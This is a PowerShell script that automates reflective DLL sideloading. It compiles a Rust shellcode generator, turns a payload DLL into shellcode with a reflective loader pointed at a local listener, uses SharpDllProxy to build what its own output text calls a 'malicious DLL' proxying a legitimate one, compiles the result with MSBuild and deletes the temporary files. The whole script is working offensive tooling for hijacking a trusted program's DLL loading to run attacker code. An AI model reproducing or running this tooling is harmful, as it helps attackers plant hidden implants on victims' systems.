# Author: @Ab4ay 
# Date: 03/07/2024


#Ripped from https://alastaircrabtree.com/how-to-find-latest-version-of-msbuild-in-powershell/
Function Find-MsBuild()
{
	$buildtoolspath32 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\msbuild.exe"
	$buildtoolspath64 = "${Env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\amd64\msbuild.exe"
	
	
	If (Test-Path $buildtoolspath32) { return $buildtoolspath32 } 
	If (Test-Path $buildtoolspath64) { return $buildtoolspath64 } 

    throw "Unable to find msbuild, please install Build Tools for VS 2019!!"
}

Function Create-sRDI {
    Set-Location .\venom-rs
    cargo build --release
    Set-Location .\target\release
    .\generate_shellcode.exe --loader .\reflective_loader.dll --payload $payload_fullPath --function Start --parameter https://127.0.0.1:1337/ --flags 1 --output shellcode.bin
    Set-Location ..\..\..
    Start-Sleep 1
}

#Creates the Reflective DLL that we will use to Sideload
Function Invoke-Reflective-DLL-Sideloading {

    if ($args.Length -eq 0) {
        Write-Host "[-] No arguments provided.`nUsage: Invoke-Reflective-DLL-Sideloading --dll 'original-dll' --payload 'shellcode.dll'"
        return
    }

    $originaldll = $args[1]
    $payload = $args[3]
    $originaldll_fullPath = (Get-Item $originaldll).FullName
    $shellcode_bin_path = ".\venom-rs\target\release\shellcode.bin"
    $payload_fullPath = (Get-Item $payload).FullName
    
    Create-sRDI

    if((Test-Path $originaldll) -and (Test-Path $payload)){

        #Write-Host "[+] Args Path:`n--------------------------------------------------"
        #Write-Host "Full path: $originaldll_fullPath"
        #Write-Host "Full path: $payload_fullPath"
        Write-Host "--------------------------------------------------"
        Write-Host "[+] Creating malicious DLL...`n--------------------------------------------------"
        .\SharpDllProxy\SharpDllProxy\bin\Release\netcoreapp3.1\SharpDllProxy.exe --dll $originaldll_fullPath --payload $shellcode_bin_path
        Create-DLL
    }else{
        Write-Host "[-] Can't find $originaldll and $payload"

        return
    }

}

Function Create-DLL {
    
    $dll_file = [System.IO.Path]::GetFileNameWithoutExtension($originaldll)
    $pragma_path = "output_${dll_file}\${dll_file}_pragma.c"
    $dll_content = Get-Content $pragma_path
    $dllTempSln = ".\CompileDLL\CompileDLL.sln"
    $tmp_folder = "output_${dll_file}"

    #create "src" folder if not exists
    $dirPath = [string](Get-Location) + "\src"
    if (-Not (Test-Path $dirPath)) {
        New-Item -Path $dirPath -ItemType Directory
    }else{
        Get-ChildItem -Path $dirPath  -File | Remove-Item -Force
    }

    Set-Content -Path ".\CompileDLL\dllmain.cpp" -Value $dll_content
    Write-Host "[+] Modifid dllmain.cpp to the contents of ${dll_file}_pragma.c"
    Write-Host "[+] Compiling sln file..."
    #build the project
    .$(Find-MsBuild) $dllTempSln /p:Platform=x64 /p:Configuration=Release | Out-Null
    

    Write-Host "[+] Compiling files to 'src' folder..."
    Copy-Item -Path ".\CompileDLL\x64\Release\CompileDLL.dll" -Destination ".\src\${originaldll}"
    Copy-Item -Path ".\${tmp_folder}\*.dll" -Destination ".\src\"
    Copy-Item -Path $shellcode_bin_path -Destination ".\src\"

    #cleanup
    Write-Host "[+] Doing some cleanups..."
    Get-ChildItem -Path $tmp_folder -File | Remove-Item -Force
    Start-Sleep -Seconds 2

}

